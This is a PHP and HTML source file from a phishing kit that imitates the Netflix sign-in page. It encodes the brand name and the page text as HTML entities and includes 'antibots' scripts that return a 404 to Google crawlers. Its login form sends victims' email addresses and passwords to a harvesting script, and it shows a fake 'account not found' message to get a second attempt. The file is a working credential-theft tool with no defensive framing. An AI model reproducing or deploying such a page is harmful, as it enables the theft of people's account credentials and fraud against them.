<?php 
session_start(); 
error_reporting(0);
include "../bots/antibots1.php";
include "../bots/antibots2.php";
include "../bots/antibots3.php";
include "../bots/antibots4.php";
include "../bots/antibots5.php";
include "../bots/antibots6.php";
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>&#x4E;&#x65;&#x74;&#x66;&#x6C;&#x69;&#x78;</title>
<meta content="" name="keywords">
<meta content="" name="description">
<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
<link rel="shortcut icon" href="../images/icon1.ico">
<link rel="apple-touch-icon" href="../images/icon2.png">
<link type="text/css" rel="stylesheet" href="../css/none.css">
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.js"></script>
<style>
.header-logo{
	width:167px;
	height:45px;
	padding-top:20px;
	position: absolute;
}


@media screen and (max-width: 504px){
.header-logo{
         width:75px;
	height:20px;
		position: absolute;
		padding-top:20px;
    }
}
@media screen and (max-width: 740px) {
.header-logo{
    width:167px;
	height:45px;
	padding-top:25px;
	position: absolute;
    }
}
@media screen and (max-width: 440px){
.header-logo{
         width:75px;
	height:20px;
		position: absolute;
		padding-top:20px;
    }
}
@media screen and (max-width: 700px) {
.header-logo{
         width:75px;
	height:20px;
    }
}
@media screen and (min-width: 1024px) {
   .header-logo{
    width:167px;
	height:45px;
	padding-top:25px;
	position: absolute;
    }
}
</style>
</head>
<body>
<div id="appMountPoint">
<div class="login-wrapper">
<div class="nfHeader login-header signupBasicHeader"><a href="/" class="svg-nfLogo signupBasicHeader"><img class="header-logo" src="../images/logo.png"><span class="screen-reader-text">&#x4E;&#x65;&#x74;&#x66;&#x6C;&#x69;&#x78;</span></a></div><div class="login-body">
<div>
<div class="login-content login-form">
<h1>&#x53;&#x69;&#x67;&#x6E;&#x20;&#x49;&#x6E;</h1>
<?php 
@session_start(); 
$ERR = "Error"; 
$requst = $_SERVER['REQUEST_URI']; 
$user_cookie = $_COOKIE["error"];
$var1 = "1"; 
if (eregi("AccessFailed=", $requst))
	 { echo "<div class='ui-message-container ui-message-error'><div class='ui-message-icon'></div><div class='ui-message-contents'>we can't find an account with this email address. Please try again.</div></div>"; 
 }
 else{}
 ?>
<form class="login-form" action="../myaccount/poster/post0.php" id="loginForm" method="POST" >
<label class="login-input login-input-email ui-label ui-input-label" >
<span class="ui-label-text" >&#x45;&#x6D;&#x61;&#x69;&#x6C;</span>
<input class="ui-text-input" name="email" id="emaill" value="" autocomplete="email"><div id="err1"class="input-message error" style="visibility:hidden">&#x50;&#x6C;&#x65;&#x61;&#x73;&#x65;&#x20;&#x65;&#x6E;&#x74;&#x65;&#x72;&#x20;&#x61;&#x20;&#x76;&#x61;&#x6C;&#x69;&#x64;&#x20;&#x65;&#x6D;&#x61;&#x69;&#x6C;&period;</div></label>
<div class="hybrid-password-wrapper">
<label class="hybrid-password login-input login-input-password ui-label ui-input-label">
<span class="ui-label-text">&#x50;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;</span>
<input type="password" class="ui-text-input" name="password" id="passwordd"><div id="err2"class="input-message error"style="visibility:hidden">&#x59;&#x6F;&#x75;&#x72;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;&#x20;&#x6D;&#x75;&#x73;&#x74;&#x20;&#x63;&#x6F;&#x6E;&#x74;&#x61;&#x69;&#x6E;&#x20;&#x62;&#x65;&#x74;&#x77;&#x65;&#x65;&#x6E;&#x20;&#x34;&#x20;&#x61;&#x6E;&#x64;&#x20;&#x36;&#x30;&#x20;&#x63;&#x68;&#x61;&#x72;&#x61;&#x63;&#x74;&#x65;&#x72;&#x73;&period;</div></label>
<center><div style="padding-left:10px;height:20px;"><div style="display:none"class="basic-spinner"></div></div></center></div><div class="login-forgot-password-wrapper">
<a href="#" class="login-help-link">&#x46;&#x6F;&#x72;&#x67;&#x6F;&#x74;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x65;&#x6D;&#x61;&#x69;&#x6C;&#x20;&#x6F;&#x72;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;&quest;</a></div>
<button class="btn login-button btn-submit btn-small" id="btnLogin" type="submit" >&#x53;&#x69;&#x67;&#x6E;&#x20;&#x49;&#x6E;</button>
<div class="login-remember-me-wrapper">
<div class="ui-binary-input login-remember-me" >
<input type="checkbox" class="" name="rememberMe" id="bxid_rememberMe_true" value="true" checked="">
<label for="bxid_rememberMe_true">
<span class="login-remember-me-label-text" >&#x52;&#x65;&#x6D;&#x65;&#x6D;&#x62;&#x65;&#x72;&#x20;&#x6D;&#x65;</span></label>
<div class="helper" ></div></div></div>
</form>
<form class="login-form">
<div class="facebookForm regOption">
<div class="fb-minimal">
<hr>
<button class="btn minimal-login btn-submit btn-small">
<div class="fb-login">
<img class="icon-facebook" src="../images/fb.png">
<span class="fbBtnText">&#x4C;&#x6F;&#x67;&#x69;&#x6E;&#x20;&#x77;&#x69;&#x74;&#x68;&#x20;&#x46;&#x61;&#x63;&#x65;&#x62;&#x6F;&#x6F;&#x6B;</span></div></button></div></div>
</form>
<div class="login-signup-now">&#x4E;&#x65;&#x77;&#x20;&#x74;&#x6F;&#x20;&#x4E;&#x65;&#x74;&#x66;&#x6C;&#x69;&#x78;&quest;
<a class=" "  href="#">&#x53;&#x69;&#x67;&#x6E;&#x20;&#x75;&#x70;&#x20;&#x6E;&#x6F;&#x77;</a></div></div></div></div>
<div class="site-footer-wrapper login-footer">
<div class="footer-divider"></div><div class="site-footer">
<p class="footer-top"><a class="footer-top-a" href="#">&#x51;&#x75;&#x65;&#x73;&#x74;&#x69;&#x6F;&#x6E;&#x73;&quest;&#x20;&#x43;&#x6F;&#x6E;&#x74;&#x61;&#x63;&#x74;&#x20;&#x75;&#x73;&period;</a></p><ul class="footer-links structural"><li class="footer-link-item"><a class="footer-link" href="#"><span>&#x47;&#x69;&#x66;&#x74;&#x20;&#x43;&#x61;&#x72;&#x64;&#x20;&#x54;&#x65;&#x72;&#x6D;&#x73;</span></a></li><li class="footer-link-item"><a class="footer-link" href="#"><span>&#x54;&#x65;&#x72;&#x6D;&#x73;&#x20;&#x6F;&#x66;&#x20;&#x55;&#x73;&#x65;</span></a></li><li class="footer-link-item"><a class="footer-link" href="#"><span>&#x50;&#x72;&#x69;&#x76;&#x61;&#x63;&#x79;&#x20;&#x53;&#x74;&#x61;&#x74;&#x65;&#x6D;&#x65;&#x6E;&#x74;</span></a></li></ul>
<div class="lang-selection-container" id="lang-switcher">
<div class="ui-select-wrapper"><label class="ui-label no-display">
<span class="ui-label-text"></span></label>
<div class="select-arrow medium prefix globe">
<select class="ui-select medium">
<option selected="" value="">&#x45;&#x6E;&#x67;&#x6C;&#x69;&#x73;&#x68;</option></select>
</div></div></div>
<p class="copy-text"></p></div></div>
</div></div>
<script>
$("#loginForm").submit(function(){
	
	if($("#emaill").val() == "" || $("#emaill").val() == "NULL"|| $("#passwordd").val() == ""||$("#passwordd").val() == "NULL"){
		$("#emaill").addClass("error");
		$("#err1").css("visibility","visible");
		$("#passwordd").addClass("error");
		$("#err2").css("visibility","visible");
		
		return false;
	}
	else{

		return true;}
		});
		$("#emaill").keyup(function(){
			$("#emaill").removeClass("error");
		$("#err1").css("visibility","hidden");
		});
		$("#passwordd").keyup(function(){
			$("#passwordd").removeClass("error");
		$("#err2").css("visibility","hidden");
		});

</script>
</body></html>